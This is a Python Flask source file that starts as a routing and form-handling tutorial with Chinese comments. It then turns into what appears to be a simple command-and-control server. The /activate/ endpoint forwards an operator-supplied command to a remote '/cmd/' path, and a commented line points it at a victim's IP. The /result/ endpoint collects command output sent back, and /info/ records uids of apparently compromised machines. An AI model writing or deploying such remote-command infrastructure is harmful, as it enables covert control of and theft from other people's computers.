import requests
from flask import Flask, redirect, url_for, request, render_template

app = Flask(__name__)


# flask中对于变量的使用

# flask中对于重定向的使用 import redirect    return redirect(url_for())
@app.route('/admin')
def hello_admin():
    return 'Hello_Admin.'


@app.route('/guest/<guest>')
def hello_guest(guest):
    return f'Hello {guest} as Guest.'


@app.route('/user/<name>')
def user(name):
    if name == 'admin':
        return redirect(url_for('hello_admin'))
    else:
        return redirect(url_for('hello_guest', guest=name))


# 表单操作
@app.route('/success/<name>')
def success(name):
    return f'Welcome {name}.'


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form['name']
        return redirect(url_for('success', name=user))
    else:
        user = request.args.get('name')
        return redirect(url_for('success', name=user))


@app.route('/activate/', methods=['GET'])
def activate():
    if request.method == 'GET':
        f = open('result.txt', 'w')
        f.write('')
        f.close()
        cmd = request.args.get('name')
        requests.get(f'http://127.0.0.1/cmd/' + cmd)
        # ip = request.args.get('ip')  # 获取 IP 地址参数
        # requests.get(f'http://{ip}/cmd/' + cmd)  # get请求，请求被害者的ip
        return redirect(url_for('result', result=cmd))


@app.route('/result/', methods=['GET', 'POST'])
def result():
    if request.method == 'POST':
        f = open('result.txt', 'a')
        result = request.form['name']
        f.write(result)
        f.close()
    return redirect(url_for('print_result'))


@app.route('/print_result/')
def print_result():
    f = open('result.txt')
    content = f.read()
    f.close()
    return render_template('result.html', content=content)


@app.route('/info/', methods=['GET', 'POST'])
def info():
    flist = open('list.txt', 'a')
    uid = request.form['uid']
    flist.write(uid)
    flist.close()
    return redirect(url_for('print_info'))


@app.route('/print_info')
def print_info():
    uidf = open('list.txt')
    uid = uidf.read()
    uidf.close()
    return render_template('list.html', uid=uid)


if __name__ == '__main__':
    app.run('127.0.0.1', 90, True)
